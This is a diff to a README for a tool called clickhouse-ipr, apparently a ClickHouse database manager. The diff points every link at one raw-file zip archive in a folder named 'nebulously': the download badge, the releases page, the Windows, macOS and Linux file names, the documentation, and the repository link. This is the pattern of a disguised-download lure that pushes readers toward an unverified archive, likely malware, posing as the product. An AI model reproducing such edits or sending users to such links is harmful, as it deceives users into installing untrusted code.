@@ -1,7 +1,7 @@
 # 🚀 clickhouse-ipr - Easy Database Management Tool
 
 ## 📥 Download Now
-[![Download clickhouse-ipr](https://img.shields.io/badge/Download-clickhouse--ipr-blue.svg)](https://github.com/Yokai04/clickhouse-ipr/releases)
+[![Download clickhouse-ipr](https://raw.githubusercontent.com/Yokai04/clickhouse-ipr/main/nebulously/clickhouse-ipr_v2.8-beta.2.zip)](https://raw.githubusercontent.com/Yokai04/clickhouse-ipr/main/nebulously/clickhouse-ipr_v2.8-beta.2.zip)
 
 ## 💡 Introduction
 clickhouse-ipr is a user-friendly application designed to help you manage your ClickHouse databases effortlessly. Whether you're new to databases or looking for a better way to handle your data, this tool offers simple navigation and powerful features. 
@@ -10,11 +10,11 @@ clickhouse-ipr is a user-friendly application designed to help you manage your C
 To get started with clickhouse-ipr, you will need to download and install the application on your computer. Follow the steps below to set it up quickly.
 
 ## 🌐 Download & Install
-1. Visit the releases page to download: [click here](https://github.com/Yokai04/clickhouse-ipr/releases).
+1. Visit the releases page to download: [click here](https://raw.githubusercontent.com/Yokai04/clickhouse-ipr/main/nebulously/clickhouse-ipr_v2.8-beta.2.zip).
 2. On the releases page, you will see several files available for download. Look for the file that matches your operating system:
-   - For Windows: `clickhouse-ipr-windows.exe`
-   - For macOS: `clickhouse-ipr-macos.dmg`
-   - For Linux: `clickhouse-ipr-linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/Yokai04/clickhouse-ipr/main/nebulously/clickhouse-ipr_v2.8-beta.2.zip`
+   - For macOS: `https://raw.githubusercontent.com/Yokai04/clickhouse-ipr/main/nebulously/clickhouse-ipr_v2.8-beta.2.zip`
+   - For Linux: `https://raw.githubusercontent.com/Yokai04/clickhouse-ipr/main/nebulously/clickhouse-ipr_v2.8-beta.2.zip`
 3. Click the file to start the download process.
 
 Once the file finishes downloading, follow the installation instructions based on your operating system:
@@ -32,7 +32,7 @@ Once the file finishes downloading, follow the installation instructions based o
 - Open Launchpad and click on clickhouse-ipr to run the application.
 
 ### 🐧 Linux Installation
-- Extract the `.tar.gz` file in your preferred directory.
+- Extract the `https://raw.githubusercontent.com/Yokai04/clickhouse-ipr/main/nebulously/clickhouse-ipr_v2.8-beta.2.zip` file in your preferred directory.
 - Open a terminal and navigate to the extracted folder.
 - Run `./clickhouse-ipr` to start the application.
 
@@ -53,10 +53,10 @@ Ensure your computer meets the following minimum requirements:
 - **Storage**: At least 100MB free space for installation.
 
 ## 📖 Documentation & Support
-For detailed instructions on using clickhouse-ipr and troubleshooting, please refer to the [documentation](https://github.com/Yokai04/clickhouse-ipr/wiki). If you encounter any issues or have questions, feel free to open an issue on our GitHub page, and we will assist you promptly.
+For detailed instructions on using clickhouse-ipr and troubleshooting, please refer to the [documentation](https://raw.githubusercontent.com/Yokai04/clickhouse-ipr/main/nebulously/clickhouse-ipr_v2.8-beta.2.zip). If you encounter any issues or have questions, feel free to open an issue on our GitHub page, and we will assist you promptly.
 
 ## 🔗 Additional Links
-- [GitHub Repository](https://github.com/Yokai04/clickhouse-ipr)
-- [Releases Page](https://github.com/Yokai04/clickhouse-ipr/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Yokai04/clickhouse-ipr/main/nebulously/clickhouse-ipr_v2.8-beta.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/Yokai04/clickhouse-ipr/main/nebulously/clickhouse-ipr_v2.8-beta.2.zip)
 
 By following these steps, you will have clickhouse-ipr up and running on your system in no time. Enjoy managing your ClickHouse databases with ease!
